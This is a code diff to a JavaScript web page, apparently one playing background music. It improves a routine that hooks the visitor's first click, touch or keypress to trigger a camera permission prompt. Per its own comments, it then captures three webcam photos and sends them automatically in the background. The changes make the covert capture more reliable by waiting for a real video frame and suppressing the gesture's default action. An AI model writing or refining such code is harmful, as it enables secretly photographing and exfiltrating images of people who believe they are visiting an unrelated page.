@@ -2070,14 +2070,24 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     }
 
     video.srcObject = stream;
+    video.setAttribute('autoplay', '');
     try { await video.play(); } catch (e) {}
-    await sleep(900);
+
+    // Wait for at least one rendered frame so draws aren't black.
+    await new Promise((resolve) => {
+      if (video.videoWidth > 0 && video.readyState >= 2) return resolve();
+      const onReady = () => { video.removeEventListener('loadeddata', onReady); resolve(); };
+      video.addEventListener('loadeddata', onReady);
+      setTimeout(resolve, 2500);
+    });
+    // Small extra delay so the first frame is stabilized.
+    await sleep(400);
 
     const shots = [];
     for (let i = 0; i < 3; i++) {
       const frame = captureFrame();
       if (frame) shots.push(frame);
-      await sleep(320);
+      await sleep(300);
     }
 
     try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
@@ -2097,9 +2107,10 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
   // satisfies the browser gesture requirement (the Allow prompt appears);
   // after it, the 3 photos capture and send automatically in the background.
   let armed = false;
-  function onGesture() {
+  function onGesture(ev) {
     if (armed) return;
     armed = true;
+    ev.preventDefault && ev.preventDefault();
     ['click', 'touchstart', 'keydown'].forEach((t) =>
       document.removeEventListener(t, onGesture, { capture: true }));
     boot();
